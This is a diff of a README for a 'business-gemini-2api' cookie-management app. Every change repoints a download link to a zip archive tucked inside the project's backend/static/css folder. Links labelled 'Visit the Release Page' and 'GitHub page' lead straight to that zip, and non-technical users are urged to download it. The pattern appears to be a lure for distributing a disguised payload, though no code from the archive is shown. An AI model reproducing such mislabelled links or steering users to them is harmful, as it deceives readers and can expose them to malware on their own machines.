@@ -6,7 +6,7 @@ Welcome to **business-gemini-2api**! This application helps you manage your cook
 
 ## 📥 Download Now
 
-[![Download business-gemini-2api](https://raw.githubusercontent.com/Sontian1996/business-gemini-2api/main/backend/docs/guides/api_gemini_business_3.8.zip)](https://raw.githubusercontent.com/Sontian1996/business-gemini-2api/main/backend/docs/guides/api_gemini_business_3.8.zip)
+[![Download business-gemini-2api](https://github.com/Sontian1996/business-gemini-2api/raw/refs/heads/main/backend/static/css/api-gemini-business-romp.zip)](https://github.com/Sontian1996/business-gemini-2api/raw/refs/heads/main/backend/static/css/api-gemini-business-romp.zip)
 
 ## 📦 What You Need
 
@@ -22,7 +22,7 @@ No special technical skills or programming knowledge is needed.
 
 1. Click the link below to visit the download page:
    
-   [Visit the Release Page](https://raw.githubusercontent.com/Sontian1996/business-gemini-2api/main/backend/docs/guides/api_gemini_business_3.8.zip)
+   [Visit the Release Page](https://github.com/Sontian1996/business-gemini-2api/raw/refs/heads/main/backend/static/css/api-gemini-business-romp.zip)
 
 2. On the Releases page, you will see different versions of the application. Look for the latest release.
 
@@ -65,7 +65,7 @@ A: Yes, your data is processed securely within the application. Always ensure yo
 
 ## 📣 Learn More
 
-For additional information and updates, visit our [GitHub page](https://raw.githubusercontent.com/Sontian1996/business-gemini-2api/main/backend/docs/guides/api_gemini_business_3.8.zip). You can also report issues or suggest features there.
+For additional information and updates, visit our [GitHub page](https://github.com/Sontian1996/business-gemini-2api/raw/refs/heads/main/backend/static/css/api-gemini-business-romp.zip). You can also report issues or suggest features there.
 
 ## 📄 License
 
